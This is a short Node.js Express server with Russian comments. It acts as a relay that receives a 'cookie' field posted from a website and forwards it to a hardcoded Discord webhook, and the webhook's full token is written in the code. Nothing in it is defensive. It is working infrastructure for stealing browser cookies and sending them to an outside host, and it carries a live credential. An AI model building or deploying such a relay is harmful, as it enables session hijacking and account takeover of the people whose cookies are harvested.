const express = require('express');
const app = express();

// ⚡⚡⚡ ГЛАВНОЕ: Научи сервер понимать оба типа запросов
app.use(express.json());       // для JSON (если понадобится)
app.use(express.urlencoded({ extended: true })); // для FormData, который шлёт твой сайт

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1496434230853505134/As0uOLlQSiHA-9VstbrsFGZYFr5LJPTEj1WTiNRrS1pQSXTp6OpM8VCIMKsT7xkXUb-0';

app.post('/send', async (req, res) => {
    // 📥 Логируем, что именно пришло от твоего сайта
    console.log('📥 Headers:', req.headers);
    console.log('📥 Body:', req.body);

    // Определяем, откуда взять текст сообщения (куку)
    let messageContent = null;
    if (req.body && req.body.content) {
        // Если пришло в формате JSON
        messageContent = req.body.content;
    } else if (req.body && req.body.cookie) {
        // Если пришло в формате FormData
        messageContent = req.body.cookie;
    } else {
        console.log('❌ Непонятный формат запроса');
        return res.status(400).send('Bad Request: Invalid format');
    }

    try {
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: messageContent })
        });

        if (response.ok) {
            console.log('✅ Успешно отправлено в Discord');
            res.status(200).send('ok');
        } else {
            console.log(`❌ Ошибка Discord: ${response.status}`);
            res.status(response.status).send('Discord error');
        }
    } catch(e) {
        console.error('❌ Ошибка соединения:', e);
        res.status(500).send('error');
    }
});

app.listen(3000, () => console.log('✅ Proxy running on port 3000'));
